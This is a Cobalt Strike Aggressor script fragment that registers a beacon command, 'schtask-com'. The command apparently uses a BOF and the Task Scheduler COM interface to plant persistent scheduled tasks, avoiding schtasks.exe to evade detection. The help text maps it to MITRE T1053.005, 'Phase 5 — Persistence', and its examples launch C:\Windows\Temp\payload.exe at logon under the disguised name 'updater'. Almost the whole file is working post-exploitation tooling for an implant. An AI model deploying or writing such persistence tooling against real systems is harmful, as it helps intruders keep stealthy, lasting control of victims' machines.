# --- schtask-com ---
alias schtask-com {
    local('$bid $name $cmd $trigger $remove $args');
    $bid     = $1;
    $name    = $2;
    $cmd     = $3;
    $trigger = $4;
    $remove  = $5;
    if ($name is $null || $cmd is $null) {
        berror($bid, "Use: schtask-com <name> <cmd> [trigger] [remove]\nExample: schtask-com updater C:\\Windows\\Temp\\payload.exe ONLOGON\nExample: schtask-com updater C:\\Windows\\Temp\\payload.exe ONLOGON remove");
        return;
    }
    if ($trigger is $null) { $trigger = "ONLOGON"; }
    if ($remove is $null)  { $remove  = ""; }
    $args = bof_pack($bid, "zzzz", $name, $cmd, $trigger, $remove);
    dani_run($bid, "schtask-com", $args);
}
beacon_command_register(
    "schtask-com",
    "Scheduled task persistence via COM — T1053.005",
    "Synopsis: schtask-com <name> <cmd> [trigger] [remove]\n\n" .
    "Description: Create a persistent scheduled task using the Task Scheduler\n" .
    "COM interface (ITaskService) — avoids schtasks.exe. Supports ONLOGON,\n" .
    "ONSTART, and DAILY trigger types. Pass 'remove' to delete the task.\n\n" .
    "Examples:\n" .
    "  schtask-com updater C:\\Windows\\Temp\\payload.exe ONLOGON\n" .
    "  schtask-com updater C:\\Windows\\Temp\\payload.exe DAILY\n" .
    "  schtask-com updater C:\\Windows\\Temp\\payload.exe ONLOGON remove\n\n" .
    "MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)\n\n" .
    "Phase: 5 — Persistence\nArgs: <name> <cmd> [trigger] [remove]"
);

